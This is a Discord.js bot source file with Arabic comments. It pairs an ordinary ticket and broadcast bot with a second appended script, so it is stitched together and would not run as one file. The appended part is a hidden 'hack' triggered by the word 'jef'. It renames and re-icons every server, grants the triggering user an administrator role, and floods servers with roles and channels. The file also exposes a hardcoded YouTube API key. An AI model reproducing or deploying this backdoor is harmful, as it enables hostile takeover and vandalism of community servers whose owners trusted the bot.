const Discord = require('discord.js');
const devs = ['389090790984515594'];
const db = require('quick.db');
const premium = ['470896018603376640']
const client = new Discord.Client();   
const bot = new Discord.Client();   
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const fs = require("fs"); 
const canvas = require("canvas");
const getYoutubeID = require('get-youtube-id'); 
const moment = require("moment");  
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const jimp = require('jimp');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const google = require('google-it'); 
const queue = new Map(); 
const zalgo = require('zalgolize');   
const fetchVideoInfo = require('youtube-info');
const YouTube = require('simple-youtube-api');
const ytdl = require('ytdl-core');
const youtube = new YouTube("AIzaSyAdORXg7UZUo7sePv97JyoDqtQVi3Ll0b8");
const sql = require("sqlite");
const dateFormat = require('dateformat'); 
const pretty = require('pretty-ms') 
const prefix = '!';
var table = require('table').table
var ti={}  
,spee={}
,attentions={};

client.on('ready', function(){
    var ms = 60000 ;
    var setGame = [`!New if want help`];
    var i = -1;
    var j = 0;
    setInterval(function (){
        if( i == -1 ){
            j = 1;
        }
        if( i == (setGame.length)-1 ){
            j = -1;
        }
        i = i+j;
        client.user.setGame(setGame[i],`http://www.twitch.tv/barontube`);
    }, ms);
    console.log(` ????????? |> Name: ${client.user.username}`);
 console.log(` ????????? |> Servers: ${client.guilds.size}`);
 console.log(` ???????????????????? |> Members: ${client.users.size}`);
 console.log(` ????????????????????? |> Channels: ${client.channels.size}`);
 console.log(` ???????????????????? |> Channels: ${client.channels.size}`);
 console.log(` ???????????????????? |> Id: ${client.user.id}`);
 console.log(` ???????????????????`);
 console.log(` ???????????????????`);
});



client.on("message", (message) => {
 
   if (message.content.startsWith("!new")) {  
        const reason = message.content.split(" ").slice(1).join(" ");  
        if (!message.guild.roles.exists("name", "Support Team")) return message.channel.send(`لازم تسوي رتبة اسمها \`Support Team\` وتنطي البوت ادمنيتر حتا يقدر يسوي الرومات ويعدل برمشنات`);
        if (message.guild.channels.exists("name", "ticket-{message.author.id}" + message.author.id)) return message.channel.send(`You already have a ticket open.`);    /// ALPHA CODES
        message.guild.createChannel(`ticket-${message.author.username}`, "text").then(c => {
            let role = message.guild.roles.find("name", "Support Team");
            let role2 = message.guild.roles.find("name", "@everyone");
            c.overwritePermissions(role, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });  
            c.overwritePermissions(role2, {
                SEND_MESSAGES: false,
                READ_MESSAGES: false
            });
            c.overwritePermissions(message.author, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });
            message.channel.send(`:white_check_mark: تم انشاء تذكرتك, #${c.name}.`);
            const embed = new Discord.RichEmbed()
                .setColor(0xCF40FA)
                .addField(`Hey ${message.author.username}!`, `:white_check_mark:  تم انشاء تذكرتك, #ticket`)
                .setTimestamp();
            c.send({
                embed: embed
            });
        }).catch(console.error);
    }
 
 
  if (message.content.startsWith("!close")) {
        if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`You can't use the close command outside of a ticket channel.`);
 
       message.channel.send(`هل انت متأكد من اقفالك للتذكرة اذا متأكد اكتب.confirm`)
           .then((m) => {
               message.channel.awaitMessages(response => response.content === '.confirm', {
                       max: 1,
                       time: 10000,
                       errors: ['time'],
                   })  
                   .then((collected) => {
                       message.channel.delete();
                   })  
                   .catch(() => {
                       m.edit('Ticket close timed out, the ticket was not closed.').then(m2 => {
                           m2.delete();
                       }, 3000);
                   });
           });
   }
 
});



client.on('message', message => {
    var prefix = "!";
    
        if (message.author.id === client.user.id) return;
        if (message.guild) {
        let args = message.content.split(' ').slice(1).join(' ');
       if(!message.member.hasPermission('ADMINISTRATOR')) return;

    if(message.content.split(' ')[0] == prefix + 'bc') {

        if (!args[1]) {
    message.channel.send("**!bc <message>**");
    return;
    }
            message.guild.members.forEach(m => {
       var bc = new Discord.RichEmbed()
       .addField( `${message.guild.name}`,  m)
       .addField('From : ', `${message.author.username}`)
       .addField(' Message ', args)
       .setColor('RANDOM')
       m.send({embed: bc});
            });
        }
        } else {
            return;
        }
});

const Discord = require("discord.js");
const client = new Discord.Client();








var x_x = "jef" //هنا تحط الامر اللي يشغل الهاك

//اسم البوت واسم السيرفر وصورهم وكل شئ

client.on('message', message => {
 if (message.content === x_x) {
  client.user.setAvatar(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setUsername("Done Hack")

 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')

 }
});

client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
  })
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  client.guilds.forEach(m => {
   m.setName(`Done Hack`)
  })
 }
});

client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;

  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)

 }
});




//اللي يسوي رتب

client.on('message', message => {
 if (!message.channel.guild) return;

 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createRole({
   name: "Done Hack",
   permissions: [8],
   color: "#23272a"
  }).then(function(role) {
   message.member.addRole(role);
  })
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });

  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: " #23272a"
  });
  message.guild.createRole({
   name: "Done Hack ",
   permissions: [1],
   color: "#ff0000"
  });


 }
});




//هنا اللي يسوي الرومات
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
